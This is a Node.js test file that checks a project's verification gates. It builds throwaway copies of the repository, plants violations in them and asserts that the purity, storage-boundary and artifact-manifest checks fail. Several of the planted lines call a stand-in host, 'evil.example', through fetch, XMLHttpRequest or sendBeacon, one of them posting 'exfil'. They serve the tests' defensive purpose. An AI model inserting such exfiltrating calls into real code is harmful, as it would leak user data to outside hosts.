// Mutation tests for the repository's own verification gates.
//
// A gate that passes a clean tree proves nothing on its own -- it must also FAIL
// a tree carrying the exact violation it exists to catch. Each case below
// introduces that violation in a throwaway copy and asserts a nonzero exit.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const repoRoot = process.cwd();

function freshCopy() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tt-gate-'));
  fs.cpSync(repoRoot, dir, {
    recursive: true,
    // Never copy the repository's git metadata. In a git worktree .git is a file that points
    // back at the real repository, so a copied one would send the mutation commit there.
    filter: (src) => {
      const rel = path.relative(repoRoot, src);
      return !src.includes(`${path.sep}node_modules`) && !src.includes(`${path.sep}_site`) &&
        rel !== '.git' && !rel.startsWith(`.git${path.sep}`);
    }
  });
  return dir;
}

function run(dir, script, env = {}) {
  return spawnSync(process.execPath, [path.join('scripts', script)], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, ...env }
  });
}

function gitCommitAll(dir) {
  // The copy gets its own fresh repository, so a commit here can never reach the repository
  // under test, and a gitless export still gets a repository to run against.
  const init = spawnSync('git', ['init', '-q'], { cwd: dir, encoding: 'utf8' });
  assert.equal(init.status, 0, 'git init failed in throwaway copy: ' + init.stderr);
  for (const args of [
    ['config', 'user.email', 'gate@test.local'],
    ['config', 'user.name', 'gate-test'],
    ['add', '-A'],
    ['commit', '-q', '-m', 'mutation']
  ]) {
    spawnSync('git', args, { cwd: dir, encoding: 'utf8' });
  }
}

test('domain-purity fails on nondeterminism and network reachable without a literal `new Date`', () => {
  const dir = freshCopy();
  try {
    assert.equal(run(dir, 'check-domain-purity.mjs').status, 0, 'baseline must be clean');
    fs.appendFileSync(
      path.join(dir, 'app/domain/deterministic-engine.js'),
      '\nexport function impure() {\n' +
        '  const id = crypto.randomUUID();\n' +
        '  const t = performance.now();\n' +
        '  const r = new XMLHttpRequest();\n' +
        '  r.open("GET", "https://evil.example");\n' +
        '  navigator.sendBeacon("https://evil.example");\n' +
        '  return [id, t];\n}\n'
    );
    const result = run(dir, 'check-domain-purity.mjs');
    assert.notEqual(result.status, 0, 'impure domain code must fail the purity gate');
    for (const label of ['crypto', 'performance', 'XMLHttpRequest', 'navigator']) {
      assert.match(result.stderr, new RegExp(label));
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('storage-boundary fails on direct localStorage access in the index.html controller', () => {
  const dir = freshCopy();
  try {
    gitCommitAll(dir);
    assert.equal(run(dir, 'check-storage-boundary.mjs').status, 0, 'baseline must be clean');

    const indexPath = path.join(dir, 'index.html');
    const source = fs.readFileSync(indexPath, 'utf8');
    const marker = '<script>\n';
    const at = source.indexOf(marker);
    assert.notEqual(at, -1, 'index.html must contain the inline controller script');
    fs.writeFileSync(
      indexPath,
      `${source.slice(0, at + marker.length)}localStorage.setItem('think-tank.shadow', 'leak');\n${source.slice(at + marker.length)}`
    );
    gitCommitAll(dir);

    const result = run(dir, 'check-storage-boundary.mjs');
    assert.notEqual(result.status, 0, 'the application controller must not be exempt from the storage boundary');
    assert.match(result.stderr, /index\.html/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('runtime-manifest fails when packaged file CONTENT is tampered after build', () => {
  const dir = freshCopy();
  try {
    const sha = 'a'.repeat(40);
    const env = { THINK_TANK_SOURCE_SHA: sha, THINK_TANK_EXPECTED_SHA: sha };
    assert.equal(run(dir, 'build-static-artifact.mjs', env).status, 0, 'build must succeed');
    assert.equal(run(dir, 'check-runtime-manifest.mjs', env).status, 0, 'baseline must verify');

    fs.appendFileSync(
      path.join(dir, '_site/app/domain/deterministic-engine.js'),
      "\nfetch('https://evil.example', { method: 'POST', body: 'exfil' });\n"
    );

    const result = run(dir, 'check-runtime-manifest.mjs', env);
    assert.notEqual(result.status, 0, 'tampered packaged JavaScript must fail the manifest check');
    assert.match(result.stderr, /artifact content mismatch/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('runtime-manifest fails when packaged index.html is tampered after build', () => {
  const dir = freshCopy();
  try {
    const sha = 'b'.repeat(40);
    const env = { THINK_TANK_SOURCE_SHA: sha, THINK_TANK_EXPECTED_SHA: sha };
    assert.equal(run(dir, 'build-static-artifact.mjs', env).status, 0);

    const indexPath = path.join(dir, '_site/index.html');
    fs.writeFileSync(
      indexPath,
      `${fs.readFileSync(indexPath, 'utf8')}\n<script>fetch('https://evil.example');</script>\n`
    );

    const result = run(dir, 'check-runtime-manifest.mjs', env);
    assert.notEqual(result.status, 0, 'tampered packaged HTML must fail the manifest check');
    assert.match(result.stderr, /artifact content mismatch/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('runtime-manifest refuses a manifest with no artifactFileHashes rather than passing it', () => {
  const dir = freshCopy();
  try {
    const sha = 'c'.repeat(40);
    const env = { THINK_TANK_SOURCE_SHA: sha, THINK_TANK_EXPECTED_SHA: sha };
    assert.equal(run(dir, 'build-static-artifact.mjs', env).status, 0);

    const manifestPath = path.join(dir, '_site/version.json');
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
    delete manifest.artifactFileHashes;
    fs.writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);

    const result = run(dir, 'check-runtime-manifest.mjs', env);
    assert.notEqual(result.status, 0, 'a legacy manifest must not be accepted as verified');
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
